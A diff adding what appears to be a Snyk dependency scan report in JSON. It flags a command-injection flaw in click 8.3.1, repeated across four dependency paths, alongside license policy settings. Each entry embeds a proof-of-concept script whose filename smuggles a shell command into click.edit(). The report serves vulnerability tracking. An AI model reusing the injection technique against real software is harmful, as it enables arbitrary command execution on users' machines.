@@ -1,0 +1,891 @@
+{
+  "vulnerabilities": [
+    {
+      "id": "SNYK-PYTHON-CLICK-16347201",
+      "title": "Command Injection",
+      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H/E:P",
+      "credit": [
+        "gokussj,Constantinos Patsakis"
+      ],
+      "semver": {
+        "vulnerable": [
+          "[8.2.0,8.3.3)"
+        ]
+      },
+      "exploit": "Proof of Concept",
+      "fixedIn": [
+        "8.3.3"
+      ],
+      "patches": [],
+      "insights": {
+        "triageAdvice": null
+      },
+      "language": "python",
+      "severity": "high",
+      "cvssScore": 7.5,
+      "functions": [],
+      "malicious": false,
+      "isDisputed": false,
+      "moduleName": "click",
+      "references": [
+        {
+          "url": "https://github.com/tsigouris007/security-advisories/security/advisories/GHSA-47fr-3ffg-hgmw",
+          "title": "GitHub Advisory"
+        },
+        {
+          "url": "https://github.com/pallets/click/commit/b96c2601af4e01341b4d2c0db494ebee4aef8f42",
+          "title": "GitHub Commit"
+        },
+        {
+          "url": "https://github.com/pallets/click/releases/tag/8.3.3",
+          "title": "GitHub Release"
+        }
+      ],
+      "cvssDetails": [
+        {
+          "assigner": "Red Hat",
+          "severity": "high",
+          "cvssV3Vector": "CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:C/C:H/I:H/A:H",
+          "cvssV3BaseScore": 7.2,
+          "modificationTime": "2026-05-05T05:26:08.673974Z"
+        },
+        {
+          "assigner": "SUSE",
+          "severity": "medium",
+          "cvssV3Vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:H",
+          "cvssV3BaseScore": 6.7,
+          "modificationTime": "2026-07-02T11:06:41.775512Z"
+        }
+      ],
+      "cvssSources": [
+        {
+          "type": "primary",
+          "vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P",
+          "assigner": "Snyk",
+          "severity": "high",
+          "baseScore": 7.5,
+          "cvssVersion": "4.0",
+          "modificationTime": "2026-07-09T15:25:32.946576Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H/E:P",
+          "assigner": "Snyk",
+          "severity": "high",
+          "baseScore": 7.5,
+          "cvssVersion": "3.1",
+          "modificationTime": "2026-07-09T15:25:32.946576Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:C/C:H/I:H/A:H",
+          "assigner": "Red Hat",
+          "severity": "high",
+          "baseScore": 7.2,
+          "cvssVersion": "3.1",
+          "modificationTime": "2026-05-05T05:26:08.673974Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:H",
+          "assigner": "SUSE",
+          "severity": "medium",
+          "baseScore": 6.7,
+          "cvssVersion": "3.1",
+          "modificationTime": "2026-07-02T11:06:41.775512Z"
+        }
+      ],
+      "description": "## Overview\n\nAffected versions of this package are vulnerable to Command Injection via the `filename` parameter passed to `edit_files()` function via `click.edit()`. This function invokes a subprocess with `shell=True` that can be injected into by including double-quoted strings in a malicious `filename`. An attacker who can convince a user to follow a malicious link can cause OS commands to be executed.\n## PoC\n```\n#!/usr/bin/env python3\nimport os\nimport subprocess\nimport click\n\ndef main():\n    marker_file = \"click_pwned_marker\"\n    malicious_filename = f'clickpoc\"; touch {marker_file}; echo \"'\n    print(f\"[*] Malicious filename: {malicious_filename}\")\n\n    try:\n        subprocess.run(['touch', malicious_filename], check=True)\n        print(f\"[+] File exists: {os.path.exists(malicious_filename)}\")\n    except Exception as e:\n        print(f\"[-] Failed to create file: {e}\")\n        return\n\n    try:\n        result = click.edit(filename=malicious_filename, editor='true')\n        print(f\"[*] click.edit() returned: {result}\")\n    except Exception as e:\n        print(f\"[!] Exception: {e}\")\n    finally:\n        if os.path.exists(malicious_filename):\n            os.remove(malicious_filename)\n\n    if os.path.exists(marker_file):\n        print(f\"[+] SUCCESS: marker file '{marker_file}' was created by the injected command.\")\n    else:\n        print(\"[-] Marker file NOT created.\")\n\nif __name__ == \"__main__\":\n    main()\n```\n## Remediation\nUpgrade `click` to version 8.3.3 or higher.\n## References\n- [GitHub Advisory](https://github.com/tsigouris007/security-advisories/security/advisories/GHSA-47fr-3ffg-hgmw)\n- [GitHub Commit](https://github.com/pallets/click/commit/b96c2601af4e01341b4d2c0db494ebee4aef8f42)\n- [GitHub Release](https://github.com/pallets/click/releases/tag/8.3.3)\n",
+      "epssDetails": {
+        "percentile": "0.52290",
+        "probability": "0.00810",
+        "modelVersion": "v2026.06.15"
+      },
+      "identifiers": {
+        "CVE": [
+          "CVE-2026-7246"
+        ],
+        "CWE": [
+          "CWE-78"
+        ],
+        "GHSA": [
+          "GHSA-47fr-3ffg-hgmw"
+        ]
+      },
+      "packageName": "click",
+      "proprietary": false,
+      "creationTime": "2026-05-03T06:54:01.030441Z",
+      "functions_new": [],
+      "alternativeIds": [],
+      "disclosureTime": "2026-04-30T14:29:14.555000Z",
+      "exploitDetails": {
+        "sources": [
+          "Snyk"
+        ],
+        "maturityLevels": [
+          {
+            "type": "secondary",
+            "level": "Proof of Concept",
+            "format": "CVSSv3"
+          },
+          {
+            "type": "primary",
+            "level": "Proof of Concept",
+            "format": "CVSSv4"
+          }
+        ]
+      },
+      "packageManager": "pip",
+      "publicationTime": "2026-05-03T06:54:01.299536Z",
+      "severityBasedOn": "CVSS",
+      "modificationTime": "2026-07-09T15:25:32.946576Z",
+      "socialTrendAlert": true,
+      "severityWithCritical": "high",
+      "from": [
+        "tinyfish-io__agentql@0.0.0",
+        "click@8.3.1"
+      ],
+      "upgradePath": [],
+      "isUpgradable": false,
+      "isPatchable": false,
+      "name": "click",
+      "version": "8.3.1"
+    },
+    {
+      "id": "SNYK-PYTHON-CLICK-16347201",
+      "title": "Command Injection",
+      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H/E:P",
+      "credit": [
+        "gokussj,Constantinos Patsakis"
+      ],
+      "semver": {
+        "vulnerable": [
+          "[8.2.0,8.3.3)"
+        ]
+      },
+      "exploit": "Proof of Concept",
+      "fixedIn": [
+        "8.3.3"
+      ],
+      "patches": [],
+      "insights": {
+        "triageAdvice": null
+      },
+      "language": "python",
+      "severity": "high",
+      "cvssScore": 7.5,
+      "functions": [],
+      "malicious": false,
+      "isDisputed": false,
+      "moduleName": "click",
+      "references": [
+        {
+          "url": "https://github.com/tsigouris007/security-advisories/security/advisories/GHSA-47fr-3ffg-hgmw",
+          "title": "GitHub Advisory"
+        },
+        {
+          "url": "https://github.com/pallets/click/commit/b96c2601af4e01341b4d2c0db494ebee4aef8f42",
+          "title": "GitHub Commit"
+        },
+        {
+          "url": "https://github.com/pallets/click/releases/tag/8.3.3",
+          "title": "GitHub Release"
+        }
+      ],
+      "cvssDetails": [
+        {
+          "assigner": "Red Hat",
+          "severity": "high",
+          "cvssV3Vector": "CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:C/C:H/I:H/A:H",
+          "cvssV3BaseScore": 7.2,
+          "modificationTime": "2026-05-05T05:26:08.673974Z"
+        },
+        {
+          "assigner": "SUSE",
+          "severity": "medium",
+          "cvssV3Vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:H",
+          "cvssV3BaseScore": 6.7,
+          "modificationTime": "2026-07-02T11:06:41.775512Z"
+        }
+      ],
+      "cvssSources": [
+        {
+          "type": "primary",
+          "vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P",
+          "assigner": "Snyk",
+          "severity": "high",
+          "baseScore": 7.5,
+          "cvssVersion": "4.0",
+          "modificationTime": "2026-07-09T15:25:32.946576Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H/E:P",
+          "assigner": "Snyk",
+          "severity": "high",
+          "baseScore": 7.5,
+          "cvssVersion": "3.1",
+          "modificationTime": "2026-07-09T15:25:32.946576Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:C/C:H/I:H/A:H",
+          "assigner": "Red Hat",
+          "severity": "high",
+          "baseScore": 7.2,
+          "cvssVersion": "3.1",
+          "modificationTime": "2026-05-05T05:26:08.673974Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:H",
+          "assigner": "SUSE",
+          "severity": "medium",
+          "baseScore": 6.7,
+          "cvssVersion": "3.1",
+          "modificationTime": "2026-07-02T11:06:41.775512Z"
+        }
+      ],
+      "description": "## Overview\n\nAffected versions of this package are vulnerable to Command Injection via the `filename` parameter passed to `edit_files()` function via `click.edit()`. This function invokes a subprocess with `shell=True` that can be injected into by including double-quoted strings in a malicious `filename`. An attacker who can convince a user to follow a malicious link can cause OS commands to be executed.\n## PoC\n```\n#!/usr/bin/env python3\nimport os\nimport subprocess\nimport click\n\ndef main():\n    marker_file = \"click_pwned_marker\"\n    malicious_filename = f'clickpoc\"; touch {marker_file}; echo \"'\n    print(f\"[*] Malicious filename: {malicious_filename}\")\n\n    try:\n        subprocess.run(['touch', malicious_filename], check=True)\n        print(f\"[+] File exists: {os.path.exists(malicious_filename)}\")\n    except Exception as e:\n        print(f\"[-] Failed to create file: {e}\")\n        return\n\n    try:\n        result = click.edit(filename=malicious_filename, editor='true')\n        print(f\"[*] click.edit() returned: {result}\")\n    except Exception as e:\n        print(f\"[!] Exception: {e}\")\n    finally:\n        if os.path.exists(malicious_filename):\n            os.remove(malicious_filename)\n\n    if os.path.exists(marker_file):\n        print(f\"[+] SUCCESS: marker file '{marker_file}' was created by the injected command.\")\n    else:\n        print(\"[-] Marker file NOT created.\")\n\nif __name__ == \"__main__\":\n    main()\n```\n## Remediation\nUpgrade `click` to version 8.3.3 or higher.\n## References\n- [GitHub Advisory](https://github.com/tsigouris007/security-advisories/security/advisories/GHSA-47fr-3ffg-hgmw)\n- [GitHub Commit](https://github.com/pallets/click/commit/b96c2601af4e01341b4d2c0db494ebee4aef8f42)\n- [GitHub Release](https://github.com/pallets/click/releases/tag/8.3.3)\n",
+      "epssDetails": {
+        "percentile": "0.52290",
+        "probability": "0.00810",
+        "modelVersion": "v2026.06.15"
+      },
+      "identifiers": {
+        "CVE": [
+          "CVE-2026-7246"
+        ],
+        "CWE": [
+          "CWE-78"
+        ],
+        "GHSA": [
+          "GHSA-47fr-3ffg-hgmw"
+        ]
+      },
+      "packageName": "click",
+      "proprietary": false,
+      "creationTime": "2026-05-03T06:54:01.030441Z",
+      "functions_new": [],
+      "alternativeIds": [],
+      "disclosureTime": "2026-04-30T14:29:14.555000Z",
+      "exploitDetails": {
+        "sources": [
+          "Snyk"
+        ],
+        "maturityLevels": [
+          {
+            "type": "secondary",
+            "level": "Proof of Concept",
+            "format": "CVSSv3"
+          },
+          {
+            "type": "primary",
+            "level": "Proof of Concept",
+            "format": "CVSSv4"
+          }
+        ]
+      },
+      "packageManager": "pip",
+      "publicationTime": "2026-05-03T06:54:01.299536Z",
+      "severityBasedOn": "CVSS",
+      "modificationTime": "2026-07-09T15:25:32.946576Z",
+      "socialTrendAlert": true,
+      "severityWithCritical": "high",
+      "from": [
+        "tinyfish-io__agentql@0.0.0",
+        "typer@0.21.1",
+        "click@8.3.1"
+      ],
+      "upgradePath": [],
+      "isUpgradable": false,
+      "isPatchable": false,
+      "name": "click",
+      "version": "8.3.1"
+    },
+    {
+      "id": "SNYK-PYTHON-CLICK-16347201",
+      "title": "Command Injection",
+      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H/E:P",
+      "credit": [
+        "gokussj,Constantinos Patsakis"
+      ],
+      "semver": {
+        "vulnerable": [
+          "[8.2.0,8.3.3)"
+        ]
+      },
+      "exploit": "Proof of Concept",
+      "fixedIn": [
+        "8.3.3"
+      ],
+      "patches": [],
+      "insights": {
+        "triageAdvice": null
+      },
+      "language": "python",
+      "severity": "high",
+      "cvssScore": 7.5,
+      "functions": [],
+      "malicious": false,
+      "isDisputed": false,
+      "moduleName": "click",
+      "references": [
+        {
+          "url": "https://github.com/tsigouris007/security-advisories/security/advisories/GHSA-47fr-3ffg-hgmw",
+          "title": "GitHub Advisory"
+        },
+        {
+          "url": "https://github.com/pallets/click/commit/b96c2601af4e01341b4d2c0db494ebee4aef8f42",
+          "title": "GitHub Commit"
+        },
+        {
+          "url": "https://github.com/pallets/click/releases/tag/8.3.3",
+          "title": "GitHub Release"
+        }
+      ],
+      "cvssDetails": [
+        {
+          "assigner": "Red Hat",
+          "severity": "high",
+          "cvssV3Vector": "CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:C/C:H/I:H/A:H",
+          "cvssV3BaseScore": 7.2,
+          "modificationTime": "2026-05-05T05:26:08.673974Z"
+        },
+        {
+          "assigner": "SUSE",
+          "severity": "medium",
+          "cvssV3Vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:H",
+          "cvssV3BaseScore": 6.7,
+          "modificationTime": "2026-07-02T11:06:41.775512Z"
+        }
+      ],
+      "cvssSources": [
+        {
+          "type": "primary",
+          "vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P",
+          "assigner": "Snyk",
+          "severity": "high",
+          "baseScore": 7.5,
+          "cvssVersion": "4.0",
+          "modificationTime": "2026-07-09T15:25:32.946576Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H/E:P",
+          "assigner": "Snyk",
+          "severity": "high",
+          "baseScore": 7.5,
+          "cvssVersion": "3.1",
+          "modificationTime": "2026-07-09T15:25:32.946576Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:C/C:H/I:H/A:H",
+          "assigner": "Red Hat",
+          "severity": "high",
+          "baseScore": 7.2,
+          "cvssVersion": "3.1",
+          "modificationTime": "2026-05-05T05:26:08.673974Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:H",
+          "assigner": "SUSE",
+          "severity": "medium",
+          "baseScore": 6.7,
+          "cvssVersion": "3.1",
+          "modificationTime": "2026-07-02T11:06:41.775512Z"
+        }
+      ],
+      "description": "## Overview\n\nAffected versions of this package are vulnerable to Command Injection via the `filename` parameter passed to `edit_files()` function via `click.edit()`. This function invokes a subprocess with `shell=True` that can be injected into by including double-quoted strings in a malicious `filename`. An attacker who can convince a user to follow a malicious link can cause OS commands to be executed.\n## PoC\n```\n#!/usr/bin/env python3\nimport os\nimport subprocess\nimport click\n\ndef main():\n    marker_file = \"click_pwned_marker\"\n    malicious_filename = f'clickpoc\"; touch {marker_file}; echo \"'\n    print(f\"[*] Malicious filename: {malicious_filename}\")\n\n    try:\n        subprocess.run(['touch', malicious_filename], check=True)\n        print(f\"[+] File exists: {os.path.exists(malicious_filename)}\")\n    except Exception as e:\n        print(f\"[-] Failed to create file: {e}\")\n        return\n\n    try:\n        result = click.edit(filename=malicious_filename, editor='true')\n        print(f\"[*] click.edit() returned: {result}\")\n    except Exception as e:\n        print(f\"[!] Exception: {e}\")\n    finally:\n        if os.path.exists(malicious_filename):\n            os.remove(malicious_filename)\n\n    if os.path.exists(marker_file):\n        print(f\"[+] SUCCESS: marker file '{marker_file}' was created by the injected command.\")\n    else:\n        print(\"[-] Marker file NOT created.\")\n\nif __name__ == \"__main__\":\n    main()\n```\n## Remediation\nUpgrade `click` to version 8.3.3 or higher.\n## References\n- [GitHub Advisory](https://github.com/tsigouris007/security-advisories/security/advisories/GHSA-47fr-3ffg-hgmw)\n- [GitHub Commit](https://github.com/pallets/click/commit/b96c2601af4e01341b4d2c0db494ebee4aef8f42)\n- [GitHub Release](https://github.com/pallets/click/releases/tag/8.3.3)\n",
+      "epssDetails": {
+        "percentile": "0.52290",
+        "probability": "0.00810",
+        "modelVersion": "v2026.06.15"
+      },
+      "identifiers": {
+        "CVE": [
+          "CVE-2026-7246"
+        ],
+        "CWE": [
+          "CWE-78"
+        ],
+        "GHSA": [
+          "GHSA-47fr-3ffg-hgmw"
+        ]
+      },
+      "packageName": "click",
+      "proprietary": false,
+      "creationTime": "2026-05-03T06:54:01.030441Z",
+      "functions_new": [],
+      "alternativeIds": [],
+      "disclosureTime": "2026-04-30T14:29:14.555000Z",
+      "exploitDetails": {
+        "sources": [
+          "Snyk"
+        ],
+        "maturityLevels": [
+          {
+            "type": "secondary",
+            "level": "Proof of Concept",
+            "format": "CVSSv3"
+          },
+          {
+            "type": "primary",
+            "level": "Proof of Concept",
+            "format": "CVSSv4"
+          }
+        ]
+      },
+      "packageManager": "pip",
+      "publicationTime": "2026-05-03T06:54:01.299536Z",
+      "severityBasedOn": "CVSS",
+      "modificationTime": "2026-07-09T15:25:32.946576Z",
+      "socialTrendAlert": true,
+      "severityWithCritical": "high",
+      "from": [
+        "tinyfish-io__agentql@0.0.0",
+        "black@26.3.1",
+        "click@8.3.1"
+      ],
+      "upgradePath": [],
+      "isUpgradable": false,
+      "isPatchable": false,
+      "name": "click",
+      "version": "8.3.1"
+    },
+    {
+      "id": "SNYK-PYTHON-CLICK-16347201",
+      "title": "Command Injection",
+      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H/E:P",
+      "credit": [
+        "gokussj,Constantinos Patsakis"
+      ],
+      "semver": {
+        "vulnerable": [
+          "[8.2.0,8.3.3)"
+        ]
+      },
+      "exploit": "Proof of Concept",
+      "fixedIn": [
+        "8.3.3"
+      ],
+      "patches": [],
+      "insights": {
+        "triageAdvice": null
+      },
+      "language": "python",
+      "severity": "high",
+      "cvssScore": 7.5,
+      "functions": [],
+      "malicious": false,
+      "isDisputed": false,
+      "moduleName": "click",
+      "references": [
+        {
+          "url": "https://github.com/tsigouris007/security-advisories/security/advisories/GHSA-47fr-3ffg-hgmw",
+          "title": "GitHub Advisory"
+        },
+        {
+          "url": "https://github.com/pallets/click/commit/b96c2601af4e01341b4d2c0db494ebee4aef8f42",
+          "title": "GitHub Commit"
+        },
+        {
+          "url": "https://github.com/pallets/click/releases/tag/8.3.3",
+          "title": "GitHub Release"
+        }
+      ],
+      "cvssDetails": [
+        {
+          "assigner": "Red Hat",
+          "severity": "high",
+          "cvssV3Vector": "CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:C/C:H/I:H/A:H",
+          "cvssV3BaseScore": 7.2,
+          "modificationTime": "2026-05-05T05:26:08.673974Z"
+        },
+        {
+          "assigner": "SUSE",
+          "severity": "medium",
+          "cvssV3Vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:H",
+          "cvssV3BaseScore": 6.7,
+          "modificationTime": "2026-07-02T11:06:41.775512Z"
+        }
+      ],
+      "cvssSources": [
+        {
+          "type": "primary",
+          "vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P",
+          "assigner": "Snyk",
+          "severity": "high",
+          "baseScore": 7.5,
+          "cvssVersion": "4.0",
+          "modificationTime": "2026-07-09T15:25:32.946576Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H/E:P",
+          "assigner": "Snyk",
+          "severity": "high",
+          "baseScore": 7.5,
+          "cvssVersion": "3.1",
+          "modificationTime": "2026-07-09T15:25:32.946576Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:C/C:H/I:H/A:H",
+          "assigner": "Red Hat",
+          "severity": "high",
+          "baseScore": 7.2,
+          "cvssVersion": "3.1",
+          "modificationTime": "2026-05-05T05:26:08.673974Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:H",
+          "assigner": "SUSE",
+          "severity": "medium",
+          "baseScore": 6.7,
+          "cvssVersion": "3.1",
+          "modificationTime": "2026-07-02T11:06:41.775512Z"
+        }
+      ],
+      "description": "## Overview\n\nAffected versions of this package are vulnerable to Command Injection via the `filename` parameter passed to `edit_files()` function via `click.edit()`. This function invokes a subprocess with `shell=True` that can be injected into by including double-quoted strings in a malicious `filename`. An attacker who can convince a user to follow a malicious link can cause OS commands to be executed.\n## PoC\n```\n#!/usr/bin/env python3\nimport os\nimport subprocess\nimport click\n\ndef main():\n    marker_file = \"click_pwned_marker\"\n    malicious_filename = f'clickpoc\"; touch {marker_file}; echo \"'\n    print(f\"[*] Malicious filename: {malicious_filename}\")\n\n    try:\n        subprocess.run(['touch', malicious_filename], check=True)\n        print(f\"[+] File exists: {os.path.exists(malicious_filename)}\")\n    except Exception as e:\n        print(f\"[-] Failed to create file: {e}\")\n        return\n\n    try:\n        result = click.edit(filename=malicious_filename, editor='true')\n        print(f\"[*] click.edit() returned: {result}\")\n    except Exception as e:\n        print(f\"[!] Exception: {e}\")\n    finally:\n        if os.path.exists(malicious_filename):\n            os.remove(malicious_filename)\n\n    if os.path.exists(marker_file):\n        print(f\"[+] SUCCESS: marker file '{marker_file}' was created by the injected command.\")\n    else:\n        print(\"[-] Marker file NOT created.\")\n\nif __name__ == \"__main__\":\n    main()\n```\n## Remediation\nUpgrade `click` to version 8.3.3 or higher.\n## References\n- [GitHub Advisory](https://github.com/tsigouris007/security-advisories/security/advisories/GHSA-47fr-3ffg-hgmw)\n- [GitHub Commit](https://github.com/pallets/click/commit/b96c2601af4e01341b4d2c0db494ebee4aef8f42)\n- [GitHub Release](https://github.com/pallets/click/releases/tag/8.3.3)\n",
+      "epssDetails": {
+        "percentile": "0.52290",
+        "probability": "0.00810",
+        "modelVersion": "v2026.06.15"
+      },
+      "identifiers": {
+        "CVE": [
+          "CVE-2026-7246"
+        ],
+        "CWE": [
+          "CWE-78"
+        ],
+        "GHSA": [
+          "GHSA-47fr-3ffg-hgmw"
+        ]
+      },
+      "packageName": "click",
+      "proprietary": false,
+      "creationTime": "2026-05-03T06:54:01.030441Z",
+      "functions_new": [],
+      "alternativeIds": [],
+      "disclosureTime": "2026-04-30T14:29:14.555000Z",
+      "exploitDetails": {
+        "sources": [
+          "Snyk"
+        ],
+        "maturityLevels": [
+          {
+            "type": "secondary",
+            "level": "Proof of Concept",
+            "format": "CVSSv3"
+          },
+          {
+            "type": "primary",
+            "level": "Proof of Concept",
+            "format": "CVSSv4"
+          }
+        ]
+      },
+      "packageManager": "pip",
+      "publicationTime": "2026-05-03T06:54:01.299536Z",
+      "severityBasedOn": "CVSS",
+      "modificationTime": "2026-07-09T15:25:32.946576Z",
+      "socialTrendAlert": true,
+      "severityWithCritical": "high",
+      "from": [
+        "tinyfish-io__agentql@0.0.0",
+        "agentql@1.17.1",
+        "typer@0.21.1",
+        "click@8.3.1"
+      ],
+      "upgradePath": [],
+      "isUpgradable": false,
+      "isPatchable": false,
+      "name": "click",
+      "version": "8.3.1"
+    }
+  ],
+  "ok": false,
+  "dependencyCount": 53,
+  "org": "wuwuyn",
+  "policy": "# Snyk (https://snyk.io) policy file, patches or ignores known vulnerabilities.\nversion: v1.25.1\nignore: {}\npatch: {}\n",
+  "isPrivate": true,
+  "licensesPolicy": {
+    "severities": {},
+    "orgLicenseRules": {
+      "AGPL-1.0": {
+        "licenseType": "AGPL-1.0",
+        "severity": "high",
+        "instructions": ""
+      },
+      "AGPL-3.0": {
+        "licenseType": "AGPL-3.0",
+        "severity": "high",
+        "instructions": ""
+      },
+      "Artistic-1.0": {
+        "licenseType": "Artistic-1.0",
+        "severity": "medium",
+        "instructions": ""
+      },
+      "Artistic-2.0": {
+        "licenseType": "Artistic-2.0",
+        "severity": "medium",
+        "instructions": ""
+      },
+      "CDDL-1.0": {
+        "licenseType": "CDDL-1.0",
+        "severity": "medium",
+        "instructions": ""
+      },
+      "CPOL-1.02": {
+        "licenseType": "CPOL-1.02",
+        "severity": "high",
+        "instructions": ""
+      },
+      "EPL-1.0": {
+        "licenseType": "EPL-1.0",
+        "severity": "medium",
+        "instructions": ""
+      },
+      "GPL-2.0": {
+        "licenseType": "GPL-2.0",
+        "severity": "high",
+        "instructions": ""
+      },
+      "GPL-3.0": {
+        "licenseType": "GPL-3.0",
+        "severity": "high",
+        "instructions": ""
+      },
+      "LGPL-2.0": {
+        "licenseType": "LGPL-2.0",
+        "severity": "medium",
+        "instructions": ""
+      },
+      "LGPL-2.1": {
+        "licenseType": "LGPL-2.1",
+        "severity": "medium",
+        "instructions": ""
+      },
+      "LGPL-3.0": {
+        "licenseType": "LGPL-3.0",
+        "severity": "medium",
+        "instructions": ""
+      },
+      "MPL-1.1": {
+        "licenseType": "MPL-1.1",
+        "severity": "medium",
+        "instructions": ""
+      },
+      "MPL-2.0": {
+        "licenseType": "MPL-2.0",
+        "severity": "medium",
+        "instructions": ""
+      },
+      "MS-RL": {
+        "licenseType": "MS-RL",
+        "severity": "medium",
+        "instructions": ""
+      },
+      "SimPL-2.0": {
+        "licenseType": "SimPL-2.0",
+        "severity": "high",
+        "instructions": ""
+      }
+    }
+  },
+  "packageManager": "pip",
+  "ignoreSettings": {
+    "adminOnly": false,
+    "reasonRequired": false,
+    "disregardFilesystemIgnores": false
+  },
+  "summary": "4 vulnerable dependency paths",
+  "remediation": {
+    "unresolved": [
+      {
+        "id": "SNYK-PYTHON-CLICK-16347201",
+        "title": "Command Injection",
+        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H/E:P",
+        "credit": [
+          "gokussj,Constantinos Patsakis"
+        ],
+        "semver": {
+          "vulnerable": [
+            "[8.2.0,8.3.3)"
+          ]
+        },
+        "exploit": "Proof of Concept",
+        "fixedIn": [
+          "8.3.3"
+        ],
+        "patches": [],
+        "insights": {
+          "triageAdvice": null
+        },
+        "language": "python",
+        "severity": "high",
+        "cvssScore": 7.5,
+        "functions": [],
+        "malicious": false,
+        "isDisputed": false,
+        "moduleName": "click",
+        "references": [
+          {
+            "url": "https://github.com/tsigouris007/security-advisories/security/advisories/GHSA-47fr-3ffg-hgmw",
+            "title": "GitHub Advisory"
+          },
+          {
+            "url": "https://github.com/pallets/click/commit/b96c2601af4e01341b4d2c0db494ebee4aef8f42",
+            "title": "GitHub Commit"
+          },
+          {
+            "url": "https://github.com/pallets/click/releases/tag/8.3.3",
+            "title": "GitHub Release"
+          }
+        ],
+        "cvssDetails": [
+          {
+            "assigner": "Red Hat",
+            "severity": "high",
+            "cvssV3Vector": "CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:C/C:H/I:H/A:H",
+            "cvssV3BaseScore": 7.2,
+            "modificationTime": "2026-05-05T05:26:08.673974Z"
+          },
+          {
+            "assigner": "SUSE",
+            "severity": "medium",
+            "cvssV3Vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:H",
+            "cvssV3BaseScore": 6.7,
+            "modificationTime": "2026-07-02T11:06:41.775512Z"
+          }
+        ],
+        "cvssSources": [
+          {
+            "type": "primary",
+            "vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P",
+            "assigner": "Snyk",
+            "severity": "high",
+            "baseScore": 7.5,
+            "cvssVersion": "4.0",
+            "modificationTime": "2026-07-09T15:25:32.946576Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H/E:P",
+            "assigner": "Snyk",
+            "severity": "high",
+            "baseScore": 7.5,
+            "cvssVersion": "3.1",
+            "modificationTime": "2026-07-09T15:25:32.946576Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:C/C:H/I:H/A:H",
+            "assigner": "Red Hat",
+            "severity": "high",
+            "baseScore": 7.2,
+            "cvssVersion": "3.1",
+            "modificationTime": "2026-05-05T05:26:08.673974Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:H",
+            "assigner": "SUSE",
+            "severity": "medium",
+            "baseScore": 6.7,
+            "cvssVersion": "3.1",
+            "modificationTime": "2026-07-02T11:06:41.775512Z"
+          }
+        ],
+        "description": "## Overview\n\nAffected versions of this package are vulnerable to Command Injection via the `filename` parameter passed to `edit_files()` function via `click.edit()`. This function invokes a subprocess with `shell=True` that can be injected into by including double-quoted strings in a malicious `filename`. An attacker who can convince a user to follow a malicious link can cause OS commands to be executed.\n## PoC\n```\n#!/usr/bin/env python3\nimport os\nimport subprocess\nimport click\n\ndef main():\n    marker_file = \"click_pwned_marker\"\n    malicious_filename = f'clickpoc\"; touch {marker_file}; echo \"'\n    print(f\"[*] Malicious filename: {malicious_filename}\")\n\n    try:\n        subprocess.run(['touch', malicious_filename], check=True)\n        print(f\"[+] File exists: {os.path.exists(malicious_filename)}\")\n    except Exception as e:\n        print(f\"[-] Failed to create file: {e}\")\n        return\n\n    try:\n        result = click.edit(filename=malicious_filename, editor='true')\n        print(f\"[*] click.edit() returned: {result}\")\n    except 